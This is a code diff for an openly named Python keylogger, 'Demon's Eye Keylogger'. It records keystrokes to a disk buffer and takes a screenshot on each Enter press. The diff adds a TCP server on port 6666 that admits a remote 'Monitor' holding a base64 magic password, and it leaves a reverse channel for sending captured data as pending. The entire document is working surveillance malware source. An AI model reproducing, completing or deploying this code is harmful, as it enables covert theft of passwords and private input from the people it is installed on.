@@ -49,6 +49,7 @@
 #
 
 import atexit
+import base64
 import datetime
 import getpass
 import glob
@@ -149,23 +150,31 @@ class ScreenShootThread (threading.Thread):
 SERVER_IP = ''
 SERVER_PORT = 6666
 SERVER_BUFFER_SIZE = 64
+MAGIC_MESSAGE = 'REVNT05TIEVZRSBLRVlMT0dHRVI='
 
 class ClientThread(threading.Thread):
-    def __init__(self, ip, port):
+    def __init__(self, conn, ip, port):
         threading.Thread.__init__(self)
+        self.conn = conn
         self.ip = ip
         self.port = port
         logging.info("Recibida petición de Monitor desde " + ip + ":" + str(port))
 
     def run(self):
         while True:
-            data = conn.recv(2048)
-            print
-            "Server received data:", data
-            MESSAGE = raw_input("Multithreaded Python server : Enter Response from Server/Enter exit:")
-            if MESSAGE == 'exit':
+            data = self.conn.recv(2048)
+            logging.info("El monitor ha enviado:", data)
+            if data == MAGIC_MESSAGE:
+                message = "Conexion establecida"
+                self.conn.send(message)
+                # Inicia comunicación inversa para enviar datos al Monitor
+                # Starts reverse comunication to send data to Monitor
+                # ... pending ...
+            else:
+                message = "No tiene permiso"
+                self.conn.send(message)
                 break
-            conn.send(MESSAGE)  # echo
+
 
 class ServerListenerThread (threading.Thread):
     def __init__(self):
@@ -180,12 +189,12 @@ class ServerListenerThread (threading.Thread):
         tcpServer.bind((SERVER_IP, SERVER_PORT))
 
         while True:
-            tcpServer.listen(5)            # 5 clients are more than enough. Normally there is only 1 monitor.
+            tcpServer.listen(5)                 # 5 clients are more than enough. Normally there is only 1 monitor.
             logging.info("Demon's Eye Keylogger server : Waiting connection from Monitor...")
             (conn, (ip, port)) = tcpServer.accept()
-            newthread = ClientThread(ip, port)
+            newthread = ClientThread(conn, ip, port)
             newthread.start()
-            self.threads.append(newthread)
+            self.threads.append(newthread)      # Inicia thread de respuesta - Starts client response thread
 
 
 ########################################################
@@ -364,27 +373,19 @@ def flush_key_buffer_to_disk():
     return True
 
 
-# en caso de teclas especiales, retorna True para las que queramos que queden registradas
+# En caso de teclas especiales, retorna True para las que queramos que queden registradas
 # o False para las que no deseemos que queden registradas.
 # si no encuentra la tecla en la lista, retorna True por defecto
 # para poder registrar teclas desconocidas hasta el momento
 def save_special_control_key(event):
     switcher = {
-        'TAB': True,
-        'LSHIFT': False,
-        'RSHIFT': False,
-        'CAPITAL': True,
-        'LCONTROL': True,
-        'RCONTROL': True,
-        'LMENU': True,
-        'RMENU': True,
-        'LWIN': False,
-        'RETURN': True
+        'TAB': True, 'LSHIFT': False, 'RSHIFT': False, 'CAPITAL': True, 'LCONTROL': True, 'RCONTROL': True,
+        'LMENU': True, 'RMENU': True, 'LWIN': False, 'RETURN': True
     }
     return switcher.get(event.Key.upper(), True)
 
 
-# añade tecla al buffer y si este esta lleno se vacia al disco
+# Añade tecla al buffer y si este esta lleno se vacia al disco - Adds key to buffer
 def add_key_to_buffer(event):
     global key_buffer, key_max_chars, key_counter
     key = event.Ascii
@@ -395,9 +396,11 @@ def add_key_to_buffer(event):
     if (key < 32) or (key > 126):
         if save_special_control_key(event):
             ckey = '[' + event.Key.upper() + ']'
+            # Cada vez que se pulsa RETURN añade salto de linea y hace captura de pantalla
+            # With each press of RETURN add the line break and take a screenshot.
             if ckey == '[ENTER]' or ckey == '[RETURN]':
                 ckey += CRLF
-                capture_screen()                # cada vez que se pulsa RETURN hace captura de pantalla
+                capture_screen()
         else:
             ckey = ''
     else:
